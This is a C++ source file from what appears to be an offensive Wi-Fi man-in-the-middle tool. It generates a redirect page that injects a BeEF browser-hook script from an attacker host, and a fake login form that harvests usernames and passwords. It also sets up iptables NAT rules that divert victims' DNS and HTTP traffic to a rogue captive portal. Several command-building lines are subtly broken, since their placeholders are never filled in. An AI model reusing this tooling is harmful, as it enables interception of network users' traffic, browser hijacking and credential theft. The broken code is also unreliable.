#include "everythingelse.hpp"


void termcolorprint(std::string color, std::string text) {
    if (color == "red"){
        std::cout << termcolor::red << text << termcolor::reset << std::endl;
    } else if (color == "green") {
        std::cout << termcolor::green << text << termcolor::reset << std::endl;
    } else if (color == "magenta") {
        std::cout << termcolor::magenta << text << termcolor::reset << std::endl;
    } else if (color == "blue") {
        std::cout << termcolor::blue << text << termcolor::reset << std::endl;
    } else if (color == "grey") {
        std::cout << termcolor::grey << text << termcolor::reset << std::endl;
    } else if (color == "cyan") {
        std::cout << termcolor::cyan << text << termcolor::reset << std::endl;
    } else if (color == "white") {
        std::cout << termcolor::white << text << termcolor::reset << std::endl;
    } else if (color == "yellow") {
        std::cout << termcolor::yellow << text << termcolor::reset << std::endl;
    };
};

void errprint(auto err) {
    termcolorprint("red" , err);
};

void shutdown_server(){
    std::string message("SHUTTING DOWN");
    update_window(stdscr, message);
    refresh();
};

/**
returns a string containing the html needed to make wither a redirect or form with
 beefhook location and formaction as the first and second parameters respectively.
 both strings;
 @param hook_loc Beef Hook Location
 @param form_action Form Action
 @param form_or_redirect, true to return redirect, false to return form
 @return The html you need when the xenomorphs come calling

*/
std::string make_html(std::string hook_loc, std::string redirect, std::string formaction, bool form_or_redirect) {
    std::string html_redirect_body;
    std::string html_form_body;
    std::string hook_location;
    std::string redirect_ip = redirect;
    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    std::string html_form_body_top = "<body><form class=\"login\" ";
    std::string form_action = "action=\"" + formaction + "\" ";
    std::string html_form_body_bottom = " method=\"post\">\
        <input type=\"text\" name=\"username\" value=\"username\">\
        <input type=\"text\" name=\"password\" value=\"password\">\
        <input type=\"submit\" name=\"submit\" value=\"submit\">\
        </form>\
        </body>\
        </html>";
    std::string html_redirect_head = "<html><head>";
    std::string beef_hook = "<script src=" + hook_loc + "></script>";
    std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
    if (form_or_redirect == true) {
        html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
        return html_redirect_body;
    } else if (form_or_redirect == false ) {
        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
        return html_form_body;
    };
};

/**
Sets up IPtables rules and other necessary things before running bettercap and/or other MITM
methods
*/
int establish_MITM(std::string netiface, std::string ip_addr, std::string port){

    system(("ip link set %i down", netiface).c_str());
    system(("ip addr add %a dev %i", ip_addr, netiface).c_str());
    try {
        system(("iwconfig %i mode monitor", netiface).c_str());
        termcolorprint("green" , "[+] Monitor Mode Enabled");
        } catch (std::exception& e) {
            auto errortext = e.what();
            errprint(errortext);
            termcolorprint("yellow" , "[-] Failed to set monitor mode");
            return 1;
        };
    system(("ip link set %i up", netiface).c_str());

    termcolorprint("green" ,"[+]Clearing IP Tables Rulesets");
    system("iptables -w 3 --flush");
    system("iptables -w 3 --table nat --flush");
    system("iptables -w 3 --delete-chain");
    system("iptables -w 3 --table nat --delete-chain");

    termcolorprint("green" ,"[+]enable ip Forwarding");
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    termcolorprint("green" ,"[+]Setup a NAT environment");
    system(("iptables -w 3 --table nat --append POSTROUTING --out-interface %i -j MASQUERADE", netiface).c_str());

    termcolorprint("yellow" , ".. Block all traffic in");
    system(("iptables -w 3 -A FORWARD -i %i -j DROP", netiface).c_str());

    termcolorprint("green" ,"[+]allow incomming from the outside on the monitor iface");
    system(("iptables -w 3 --append FORWARD --in-interface %i -j ACCEPT", netiface).c_str());

    termcolorprint("green" ,"[+]allow UDP DNS resolution inside the NAT  via prerouting");
    system(("iptables -w 3 -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to ", ip_addr).c_str());

    termcolorprint("green" ,"[+]Allow Loopback Connections");
    system("iptables -w 3 -A INPUT -i lo -j ACCEPT");
    system("iptables -w 3 -A OUTPUT -o lo -j ACCEPT");

    termcolorprint("green" ,"[+]Allow Established and Related Incoming Connections");
    system("iptables -w 3 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT");

    termcolorprint("green" ,"[+]Allow Established Outgoing Connections");
    system("iptables -w 3 -A OUTPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT");

    //#termcolorprint("green" ,("[+]Internal to External")
    //system("iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(moniface, iface))

    termcolorprint("green" ,"[+]Drop Invalid Packets");
    system("iptables -w 3 -A INPUT -m conntrack --ctstate INVALID -j DROP");
    system("iptables -w 3 -A FORWARD -i %i -p tcp --dport 53 -j ACCEPT");
    system("iptables -w 3 -A FORWARD -i %i -p udp --dport 53 -j ACCEPT");

    termcolorprint("yellow" , ".. Allow traffic to captive portal");
    system(("iptables -w 3 -A FORWARD -i %i -p tcp --dport %p -d %i -j ACCEPT", netiface, port, ip_addr).c_str());
/*   ###################################################
    #
    #       HERE IS WHERE THE WERVER IS STARTED
    #
    #
    ###################################################*/
    termcolorprint("green" ,"Redirecting HTTP traffic to captive portal");
    system(("iptables -t nat -A PREROUTING -i %i -p tcp --dport 80 -j DNAT --to-destination %d", netiface, ip_addr).c_str());

};
